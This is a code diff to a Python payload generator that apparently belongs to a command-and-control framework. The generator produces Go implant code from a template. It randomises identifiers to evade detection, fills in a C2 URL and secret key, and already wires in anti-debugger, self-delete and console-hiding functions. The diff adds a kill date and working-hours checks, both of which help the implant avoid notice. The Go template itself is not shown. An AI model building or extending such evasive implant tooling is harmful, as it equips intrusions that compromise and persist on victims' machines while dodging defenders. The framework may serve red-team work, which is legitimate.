@@ -416,6 +416,8 @@ class PayloadGenerator:
         agent_secret_key_field = poly.generate_go_field_name('SecretKey')
         agent_current_interactive_task_field = poly.generate_go_field_name('CurrentInteractiveTask')
         agent_disable_sandbox_field = poly.generate_go_field_name('DisableSandbox')
+        agent_kill_date_field = poly.generate_go_field_name('KillDate')
+        agent_working_hours_field = poly.generate_go_field_name('WorkingHours')
 
         # Generate random names for task struct fields
         task_id_field = poly.generate_go_field_name('ID')
@@ -455,6 +457,8 @@ class PayloadGenerator:
         agent_check_windows_debugger_func = poly.generate_random_name('checkWindowsDebugger')
         agent_self_delete_func = poly.generate_random_name('selfDelete')
         agent_hide_console_func = poly.generate_random_name('hideConsole')
+        agent_check_working_hours_func = poly.generate_random_name('checkWorkingHours')
+        agent_check_kill_date_func = poly.generate_random_name('checkKillDate')
 
         template_path = os.path.join(os.path.dirname(__file__), 'go_agent_template.go')
         with open(template_path, 'r') as f:
@@ -483,6 +487,8 @@ class PayloadGenerator:
         go_code = go_code.replace('{AGENT_SECRET_KEY_FIELD}', agent_secret_key_field)
         go_code = go_code.replace('{AGENT_CURRENT_INTERACTIVE_TASK_FIELD}', agent_current_interactive_task_field)
         go_code = go_code.replace('{AGENT_DISABLE_SANDBOX_FIELD}', agent_disable_sandbox_field)
+        go_code = go_code.replace('{AGENT_KILL_DATE_FIELD}', agent_kill_date_field)
+        go_code = go_code.replace('{AGENT_WORKING_HOURS_FIELD}', agent_working_hours_field)
         go_code = go_code.replace('{TASK_ID_FIELD}', task_id_field)
         go_code = go_code.replace('{TASK_COMMAND_FIELD}', task_command_field)
         go_code = go_code.replace('{TASK_RESULT_TASK_ID_FIELD}', task_result_task_id_field)
@@ -516,12 +522,31 @@ class PayloadGenerator:
         go_code = go_code.replace('{AGENT_CHECK_WINDOWS_DEBUGGER_FUNC}', agent_check_windows_debugger_func)
         go_code = go_code.replace('{AGENT_SELF_DELETE_FUNC}', agent_self_delete_func)
         go_code = go_code.replace('{AGENT_HIDE_CONSOLE_FUNC}', agent_hide_console_func)
+        go_code = go_code.replace('{AGENT_CHECK_WORKING_HOURS_FUNC}', agent_check_working_hours_func)
+        go_code = go_code.replace('{AGENT_CHECK_KILL_DATE_FUNC}', agent_check_kill_date_func)
+
+        # Extract kill_date and working_hours from profile_config
+        kill_date = profile_config.get('kill_date', '2025-12-31T23:59:59Z')
+        working_hours = profile_config.get('working_hours', {
+            "start_hour": 9,
+            "end_hour": 17,
+            "timezone": "UTC",
+            "days": [1, 2, 3, 4, 5]
+        })
 
         # Replace remaining simple placeholders
         go_code = go_code.replace('{AGENT_ID}', agent_id)
         go_code = go_code.replace('{SECRET_KEY}', secret_key)
         go_code = go_code.replace('{C2_URL}', c2_url)
         go_code = go_code.replace('{DISABLE_SANDBOX}', 'true' if disable_sandbox else 'false')
+        go_code = go_code.replace('{KILL_DATE}', kill_date)
+        go_code = go_code.replace('{WORKING_HOURS_START_HOUR}', str(working_hours.get('start_hour', 9)))
+        go_code = go_code.replace('{WORKING_HOURS_END_HOUR}', str(working_hours.get('end_hour', 17)))
+        go_code = go_code.replace('{WORKING_HOURS_TIMEZONE}', working_hours.get('timezone', 'UTC'))
+        # Convert the days list to a Go slice literal (remove square brackets and add them back in the template)
+        days_list = working_hours.get('days', [1, 2, 3, 4, 5])
+        days_str = ', '.join(map(str, days_list))
+        go_code = go_code.replace('{WORKING_HOURS_DAYS}', days_str)
 
         logs_dir = 'logs'
         if not os.path.exists(logs_dir):
